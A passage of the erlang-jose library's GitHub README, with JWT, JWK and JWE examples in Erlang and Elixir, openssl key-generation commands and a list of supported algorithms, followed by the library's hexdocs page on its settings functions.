% JSON Web Key (JWK)
JWK = #{
  <<"kty">> => <<"oct">>,
  <<"k">> => jose_base64url:encode(<<"symmetric key">>)
}.

% JSON Web Signature (JWS)
JWS = #{
  <<"alg">> => <<"HS256">>
}.

% JSON Web Token (JWT)
JWT = #{
  <<"iss">> => <<"joe">>,
  <<"exp">> => 1300819380,
  <<"http://example.com/is_root">> => true
}.

Signed = jose_jwt:sign(JWK, JWS, JWT).
% {#{alg => jose_jws_alg_hmac},
%  #{<<"payload">> => <<"eyJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlLCJpc3MiOiJqb2UifQ">>,
%    <<"protected">> => <<"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9">>,
%    <<"signature">> => <<"shLcxOl_HBBsOTvPnskfIlxHUibPN7Y9T4LhPB-iBwM">>}}

CompactSigned = jose_jws:compact(Signed).
% {#{alg => jose_jws_alg_hmac},
%  <<"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlLCJpc3MiOiJqb2UifQ.shLcxOl_HBBsOTvPnskfIlxHUibPN7Y9T4LhPB-iBwM">>}

Verified = jose_jwt:verify(JWK, CompactSigned).
% {true,
%     #jose_jwt{
%         fields =
%             #{<<"exp">> => 1300819380,
%               <<"http://example.com/is_root">> => true,
%               <<"iss">> => <<"joe">>}},
%     #jose_jws{
%         alg = {jose_jws_alg_hmac,'HS256'},
%         b64 = undefined,
%         fields = #{<<"typ">> => <<"JWT">>}}}

Verified =:= jose_jwt:verify(JWK, Signed).
% true
```

##### Reading JSON Web Keys (JWK) from PEM files

The examples below use three keys created with `openssl`:

```
# RSA Private Key
openssl genrsa -out rsa-2048.pem 2048

# EC Private Key (Alice)
openssl ecparam -name secp256r1 -genkey -noout -out ec-secp256r1-alice.pem

# EC Private Key (Bob)
openssl ecparam -name secp256r1 -genkey -noout -out ec-secp256r1-bob.pem
```

*Elixir*

```
# RSA examples
rsa_private_jwk = JOSE.JWK.from_pem_file("rsa-2048.pem")
rsa_public_jwk  = JOSE.JWK.to_public(rsa_private_jwk)

## Sign and Verify (defaults to PS256)
message = "my message"
signed = JOSE.JWK.sign(message, rsa_private_jwk)
{true, ^message, _} = JOSE.JWK.verify(signed, rsa_public_jwk)

## Sign and Verify (specify RS256)
signed = JOSE.JWK.sign(message, %{ "alg" => "RS256" }, rsa_private_jwk)
{true, ^message, _} = JOSE.JWK.verify(signed, rsa_public_jwk)

## Encrypt and Decrypt (defaults to RSA-OAEP with A128CBC-HS256)
plain_text = "my plain text"
encrypted = JOSE.JWK.block_encrypt(plain_text, rsa_public_jwk)
{^plain_text, _} = JOSE.JWK.block_decrypt(encrypted, rsa_private_jwk)

## Encrypt and Decrypt (specify RSA-OAEP-256 with A128GCM)
encrypted = JOSE.JWK.block_encrypt(plain_text, %{ "alg" => "RSA-OAEP-256", "enc" => "A128GCM" }, rsa_public_jwk)
{^plain_text, _} = JOSE.JWK.block_decrypt(encrypted, rsa_private_jwk)

# EC examples
alice_private_jwk = JOSE.JWK.from_pem_file("ec-secp256r1-alice.pem")
alice_public_jwk  = JOSE.JWK.to_public(alice_private_jwk)
bob_private_jwk   = JOSE.JWK.from_pem_file("ec-secp256r1-bob.pem")
bob_public_jwk    = JOSE.JWK.to_public(bob_private_jwk)

## Sign and Verify (defaults to ES256)
message = "my message"
signed = JOSE.JWK.sign(message, alice_private_jwk)
{true, ^message, _} = JOSE.JWK.verify(signed, alice_public_jwk)

## Encrypt and Decrypt (defaults to ECDH-ES with A128GCM)
### Alice sends Bob a secret message using Bob's public key and Alice's private key
alice_to_bob = "For Bob's eyes only."
encrypted = JOSE.JWK.box_encrypt(alice_to_bob, bob_public_jwk, alice_private_jwk)
### Only Bob can decrypt the message using his private key (Alice's public key is embedded in the JWE header)
{^alice_to_bob, _} = JOSE.JWK.box_decrypt(encrypted, bob_private_jwk)
```

*Erlang*

```
% RSA examples
RSAPrivateJWK = jose_jwk:from_pem_file("rsa-2048.pem"),
RSAPublicJWK  = jose_jwk:to_public(RSAPrivateJWK).

%% Sign and Verify (defaults to PS256)
Message = <<"my message">>,
SignedPS256 = jose_jwk:sign(Message, RSAPrivateJWK),
{true, Message, _} = jose_jwk:verify(SignedPS256, RSAPublicJWK).

%% Sign and Verify (specify RS256)
SignedRS256 = jose_jwk:sign(Message, #{ <<"alg">> => <<"RS256">> }, RSAPrivateJWK),
{true, Message, _} = jose_jwk:verify(SignedRS256, RSAPublicJWK).

%% Encrypt and Decrypt (defaults to RSA-OAEP with A128CBC-HS256)
PlainText = <<"my plain text">>,
EncryptedRSAOAEP = jose_jwk:block_encrypt(PlainText, RSAPublicJWK),
{PlainText, _} = jose_jwk:block_decrypt(EncryptedRSAOAEP, RSAPrivateJWK).

%% Encrypt and Decrypt (specify RSA-OAEP-256 with A128GCM)
EncryptedRSAOAEP256 = jose_jwk:block_encrypt(PlainText, #{ <<"alg">> => <<"RSA-OAEP-256">>, <<"enc">> => <<"A128GCM">> }, RSAPublicJWK),
{PlainText, _} = jose_jwk:block_decrypt(EncryptedRSAOAEP256, RSAPrivateJWK).

% EC examples
AlicePrivateJWK = jose_jwk:from_pem_file("ec-secp256r1-alice.pem"),
AlicePublicJWK  = jose_jwk:to_public(AlicePrivateJWK),
BobPrivateJWK   = jose_jwk:from_pem_file("ec-secp256r1-bob.pem"),
BobPublicJWK    = jose_jwk:to_public(BobPrivateJWK).

%% Sign and Verify (defaults to ES256)
Message = <<"my message">>,
SignedES256 = jose_jwk:sign(Message, AlicePrivateJWK),
{true, Message, _} = jose_jwk:verify(SignedES256, AlicePublicJWK).

%% Encrypt and Decrypt (defaults to ECDH-ES with A128GCM)
%%% Alice sends Bob a secret message using Bob's public key and Alice's private key
AliceToBob = <<"For Bob's eyes only.">>,
EncryptedECDHES = jose_jwk:box_encrypt(AliceToBob, BobPublicJWK, AlicePrivateJWK),
%%% Only Bob can decrypt the message using his private key (Alice's public key is embedded in the JWE header)
{AliceToBob, _} = jose_jwk:box_decrypt(EncryptedECDHES, BobPrivateJWK).
```

## Algorithm Support

### JSON Web Encryption (JWE) [RFC 7516](https://tools.ietf.org/html/rfc7516)

#### `"alg"` [RFC 7518 Section 4](https://tools.ietf.org/html/rfc7518#section-4)

* `A128GCMKW`
* `A192GCMKW`
* `A256GCMKW`
* `A128KW`
* `A192KW`
* `A256KW`
* `C20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02)
* `dir`
* `ECDH-1PU` [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+A128GCMKW` non-standard, [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+A192GCMKW` non-standard, [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+A256GCMKW` non-standard, [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+A128KW` [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+A192KW` [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+A256KW` [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+C20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02), [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-1PU+XC20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02), [draft-madden-jose-ecdh-1pu](https://datatracker.ietf.org/doc/html/draft-madden-jose-ecdh-1pu-04)
* `ECDH-ES`
* `ECDH-ES+A128GCMKW` non-standard
* `ECDH-ES+A192GCMKW` non-standard
* `ECDH-ES+A256GCMKW` non-standard
* `ECDH-ES+A128KW`
* `ECDH-ES+A192KW`
* `ECDH-ES+A256KW`
* `ECDH-ES+C20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02)
* `ECDH-ES+XC20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02)
* `ECDH-SS` [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+A128GCMKW` non-standard, [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+A192GCMKW` non-standard, [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+A256GCMKW` non-standard, [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+A128KW` [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+A192KW` [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+A256KW` [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+C20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02), [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `ECDH-SS+XC20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02), [draft-amringer-jose-ecdh-ss](https://datatracker.ietf.org/doc/html/draft-amringer-jose-ecdh-ss-00)
* `PBES2-HS256+A128GCMKW` non-standard
* `PBES2-HS384+A192GCMKW` non-standard
* `PBES2-HS512+A256GCMKW` non-standard
* `PBES2-HS256+A128KW`
* `PBES2-HS384+A192KW`
* `PBES2-HS512+A256KW`
* `PBES2-HS512+C20PKW` non-standard
* `PBES2-HS512+XC20PKW` non-standard
* `RSA1_5`
* `RSA-OAEP`
* `RSA-OAEP-256`
* `XC20PKW` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02)

#### `"enc"` [RFC 7518 Section 5](https://tools.ietf.org/html/rfc7518#section-5)

* `A128CBC-HS256`
* `A192CBC-HS384`
* `A256CBC-HS512`
* `A128GCM`
* `A192GCM`
* `A256GCM`
* `C20P` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02)
* `XC20P` [draft-amringer-jose-chacha](https://datatracker.ietf.org/doc/html/draft-amringer-jose-chacha-02)

#### `"zip"` [RFC 7518 Section 7.3](https://tools.ietf.org/html/rfc7518#section-7.3)

* `DEF`

### JSON Web Key (JWK) [RFC 7517](https://tools.ietf.org/html/rfc7517)

#### `"alg"` [RFC 7518 Section 6](https://tools.ietf.org/html/rfc7518#section-6)

* `EC`
* `oct`
* `OKP` [RFC 8037](https://tools.ietf.org/html/rfc8037)
* `OKP` with `{"crv":"Ed25519"}` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.1)
* `OKP` with `{"crv":"Ed25519ph"}` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.1)
* `OKP` with `{"crv":"Ed448"}` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.2)
* `OKP` with `{"crv":"Ed448ph"}` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.2)
* `OKP` with `{"crv":"X25519"}` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 7748](https://tools.ietf.org/html/rfc7748#section-5)
* `OKP` with `{"crv":"X448"}` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 7748](https://tools.ietf.org/html/rfc7748#section-5)
* `RSA`

### JSON Web Signature (JWS) [RFC 7515](https://tools.ietf.org/html/rfc7515)

#### `"alg"` [RFC 7518 Section 3](https://tools.ietf.org/html/rfc7518#section-3)

* `Ed25519` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.1)
* `Ed25519ph` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.1)
* `Ed448` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.2)
* `Ed448ph` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032#section-5.2)
* `EdDSA` [RFC 8037](https://tools.ietf.org/html/rfc8037), [RFC 8032](https://tools.ietf.org/html/rfc8032)
* `ES256K` [RFC 8812](https://datatracker.ietf.org/doc/html/rfc8812)
* `ES256`
* `ES384`
* `ES512`
* `HS256`
* `HS384`
* `HS512`
* `Poly1305` non-standard
* `PS256`
* `PS384`
* `PS512`
* `RS1` deprecated, [RFC 8812](https://datatracker.ietf.org/doc/html/rfc8812)
* `RS256`
* `RS384`
* `RS512`
* `none` [unsecured](#footnote-unsecured)

### Additional Specifications

* JSON Web Key (JWK) Thumbprint [RFC 7638](https://tools.ietf.org/html/rfc7638)
* JWS Unencoded Payload Option [RFC 7797](https://tools.ietf.org/html/rfc7797)

unsecured This algorithm is disabled by default due to the unsecured signing vulnerability. Use the [`unsecured_signing`](#unsecured-signing-vulnerability) setting to enable this algorithm.

## About

JSON Object Signing and Encryption (JOSE) for Erlang and Elixir

[hexdocs.pm/jose](http://hexdocs.pm/jose "http://hexdocs.pm/jose")

### Topics

[jwt](/topics/jwt "Topic: jwt")
[cryptography](/topics/cryptography "Topic: cryptography")
[erlang](/topics/erlang "Topic: erlang")
[elixir](/topics/elixir "Topic: elixir")
[jose](/topics/jose "Topic: jose")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/potatosalad/erlang-jose/activity)
### Stars

[**314**
stars](/potatosalad/erlang-jose/stargazers)
### Watchers

[**17**
watching](/potatosalad/erlang-jose/watchers)
### Forks

[**105**
forks](/potatosalad/erlang-jose/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fpotatosalad%2Ferlang-jose&report=potatosalad+%28user%29)

## [Releases 14](/potatosalad/erlang-jose/releases)

[1.11.10 (2024-04-17)
Latest

Apr 17, 2024](/potatosalad/erlang-jose/releases/tag/1.11.10)
[+ 13 releases](/potatosalad/erlang-jose/releases)

## [Packages 0](/users/potatosalad/packages?repo_name=erlang-jose)

No packages published

## [Contributors 34](/potatosalad/erlang-jose/graphs/contributors)

* [![@potatosalad](https://avatars.githubusercontent.com/u/1804?s=64&v=4)](https://github.com/potatosalad)
* [![@ericmj](https://avatars.githubusercontent.com/u/316890?s=64&v=4)](https://github.com/ericmj)
* [![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=64&v=4)](https://github.com/michaelklishin)
* [![@whatyouhide](https://avatars.githubusercontent.com/u/3890250?s=64&v=4)](https://github.com/whatyouhide)
* [![@talklittle](https://avatars.githubusercontent.com/u/87961?s=64&v=4)](https://github.com/talklittle)
* [![@behe](https://avatars.githubusercontent.com/u/90303?s=64&v=4)](https://github.com/behe)
* [![@HoloRin](https://avatars.githubusercontent.com/u/217064?s=64&v=4)](https://github.com/HoloRin)
* [![@maennchen](https://avatars.githubusercontent.com/u/333918?s=64&v=4)](https://github.com/maennchen)
* [![@victorolinasc](https://avatars.githubusercontent.com/u/376386?s=64&v=4)](https://github.com/victorolinasc)
* [![@ntrepid8](https://avatars.githubusercontent.com/u/482948?s=64&v=4)](https://github.com/ntrepid8)
* [![@alexandrejbr](https://avatars.githubusercontent.com/u/1188385?s=64&v=4)](https://github.com/alexandrejbr)
* [![@cs-victor-nascimento](https://avatars.githubusercontent.com/u/7049728?s=64&v=4)](https://github.com/cs-victor-nascimento)
* [![@thiamsantos](https://avatars.githubusercontent.com/u/13632762?s=64&v=4)](https://github.com/thiamsantos)
* [![@spencerdcarlson](https://avatars.githubusercontent.com/u/1206303?s=64&v=4)](https://github.com/spencerdcarlson)

[+ 20 contributors](/potatosalad/erlang-jose/graphs/contributors)

## Languages

* [Erlang
  85.6%](/potatosalad/erlang-jose/search?l=erlang)
* [Elixir
  14.3%](/potatosalad/erlang-jose/search?l=elixir)
* Other
  0.1%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from hexdocs.pm_a0aadd31_20250110_123329.html ===


Search documentation of JOSE

[JOSE](readme.html)
v1.11.10

* Pages
* Modules

# Settings [View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L11 "View Source") jose (JOSE v1.11.10)

# Summary

## [Functions](#functions)

[chacha20\_poly1305\_module()](#chacha20_poly1305_module/0)

[chacha20\_poly1305\_module(ChaCha20Poly1305Module)](#chacha20_poly1305_module/1)

[crypto\_fallback()](#crypto_fallback/0)

[crypto\_fallback(Boolean)](#crypto_fallback/1)

[curve448\_module()](#curve448_module/0)

[curve448\_module(Curve448Module)](#curve448_module/1)

[curve25519\_module()](#curve25519_module/0)

[curve25519\_module(Curve25519Module)](#curve25519_module/1)

[decode(Binary)](#decode/1)

[encode(Term)](#encode/1)

[json\_module()](#json_module/0)

[json\_module(JSONModule)](#json_module/1)

[pbes2\_count\_maximum()](#pbes2_count_maximum/0)

[pbes2\_count\_maximum(PBES2CountMaximum)](#pbes2_count_maximum/1)

[sha3\_module()](#sha3_module/0)

[sha3\_module(SHA3Module)](#sha3_module/1)

[start()](#start/0)

[unsecured\_signing()](#unsecured_signing/0)

[unsecured\_signing(UnsecuredSigning)](#unsecured_signing/1)

[xchacha20\_poly1305\_module()](#xchacha20_poly1305_module/0)

[xchacha20\_poly1305\_module(XChaCha20Poly1305Module)](#xchacha20_poly1305_module/1)

# Functions

[Link to this function](#chacha20_poly1305_module/0 "Link to this function")
# chacha20\_poly1305\_module()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L51 "View Source")

[Link to this function](#chacha20_poly1305_module/1 "Link to this function")
# chacha20\_poly1305\_module(ChaCha20Poly1305Module)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L54 "View Source")

[Link to this function](#crypto_fallback/0 "Link to this function")
# crypto\_fallback()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L57 "View Source")

[Link to this function](#crypto_fallback/1 "Link to this function")
# crypto\_fallback(Boolean)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L60 "View Source")

[Link to this function](#curve448_module/0 "Link to this function")
# curve448\_module()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L69 "View Source")

[Link to this function](#curve448_module/1 "Link to this function")
# curve448\_module(Curve448Module)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L72 "View Source")

[Link to this function](#curve25519_module/0 "Link to this function")
# curve25519\_module()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L63 "View Source")

[Link to this function](#curve25519_module/1 "Link to this function")
# curve25519\_module(Curve25519Module)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L66 "View Source")

[Link to this function](#decode/1 "Link to this function")
# decode(Binary)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L75 "View Source")

[Link to this function](#encode/1 "Link to this function")
# encode(Term)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L79 "View Source")

[Link to this function](#json_module/0 "Link to this function")
# json\_module()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L83 "View Source")

[Link to this function](#json_module/1 "Link to this function")
# json\_module(JSONModule)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L86 "View Source")

[Link to this function](#pbes2_count_maximum/0 "Link to this function")
# pbes2\_count\_maximum()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L90 "View Source")

```
-spec pbes2_count_maximum() -> non_neg_integer().
```

[Link to this function](#pbes2_count_maximum/1 "Link to this function")
# pbes2\_count\_maximum(PBES2CountMaximum)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L94 "View Source")

```
-spec pbes2_count_maximum(PBES2CountMaximum) -> ok when PBES2CountMaximum :: non_neg_integer().
```

[Link to this function](#sha3_module/0 "Link to this function")
# sha3\_module()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L97 "View Source")

[Link to this function](#sha3_module/1 "Link to this function")
# sha3\_module(SHA3Module)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L100 "View Source")

[Link to this function](#start/0 "Link to this function")
# start()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L121 "View Source")

[Link to this function](#unsecured_signing/0 "Link to this function")
# unsecured\_signing()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L104 "View Source")

```
-spec unsecured_signing() -> boolean().
```

[Link to this function](#unsecured_signing/1 "Link to this function")
# unsecured\_signing(UnsecuredSigning)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L108 "View Source")

```
-spec unsecured_signing(UnsecuredSigning) -> ok when UnsecuredSigning :: boolean().
```

[Link to this function](#xchacha20_poly1305_module/0 "Link to this function")
# xchacha20\_poly1305\_module()

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L111 "View Source")

[Link to this function](#xchacha20_poly1305_module/1 "Link to this function")
# xchacha20\_poly1305\_module(XChaCha20Poly1305Module)

[View Source](https://github.com/potatosalad/erlang-jose/blob/eb6de2cb506b55533f550a1b0776c81b15317e23/src/jose.erl#L114 "View Source")

[Hex Package](https://hex.pm/packages/jose/1.11.10)
[Hex Preview](https://preview.hex.pm/preview/jose/1.11.10)
([current file](https://preview.hex.pm/preview/jose/1.11.10/show/src/jose.erl))

Search HexDocs

[Download ePub version](JOSE.epub "ePub version")

Built using
[ExDoc](https://github.com/elixir-lang/ex_doc "ExDoc") (v0.30.9) for the
[Elixir programming language](https://elixir-lang.org "Elixir")


